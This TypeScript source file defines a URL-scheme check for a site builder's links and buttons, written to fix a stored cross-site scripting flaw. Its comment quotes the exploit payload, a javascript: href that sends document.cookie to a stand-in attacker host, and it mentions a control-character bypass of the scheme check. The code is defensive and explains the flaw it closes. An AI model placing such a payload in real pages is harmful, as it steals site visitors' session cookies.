/**
 * Which URLs the app will write into a page — with no dependencies, because
 * the formatting toolbar and the button block both ask, and both run in the
 * browser.
 */

/**
 * A URL a link or a media reference may point at.
 *
 * Nothing used to check the scheme of a button's `href`. A block whose href is
 * `javascript:fetch('https://attacker/'+document.cookie)` was stored,
 * published, and copied into the download unchanged. On the builder origin the
 * nonce CSP refuses the navigation; the exported site has no CSP at all, so on
 * the customer's own domain the call-to-action button — the element visitors
 * click most — ran the attacker's script.
 *
 * Returns the URL to use, or `undefined` when there is nothing safe to keep.
 * Relative paths and fragments are fine; they cannot name a scheme. Control
 * characters are removed first, because a browser strips them before parsing
 * the scheme and so `java\0script:` is `javascript:` to everything that
 * matters.
 */
export function isSafeHref(value: unknown): string | undefined {
  if (typeof value !== "string") return undefined;

  // Tab, newline and NUL are dropped by URL parsers inside a scheme.
  const cleaned = value.replace(/[\u0000-\u0020\u007f]/g, (c) => (c === " " ? " " : "")).trim();
  if (!cleaned) return undefined;

  // A fragment or a path. Neither can carry a scheme, but `//host` is
  // protocol-relative and does name somewhere else, which is still fine over
  // http(s) — it is only a scheme we are ruling on here.
  if (/^[#/?]/.test(cleaned)) return cleaned;
  if (cleaned.startsWith("./") || cleaned.startsWith("../")) return cleaned;

  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(cleaned)?.[1]?.toLowerCase();
  // No scheme at all: a bare relative reference such as `about.html`.
  if (!scheme) return cleaned;

  return ["http", "https", "mailto", "tel"].includes(scheme) ? cleaned : undefined;
}
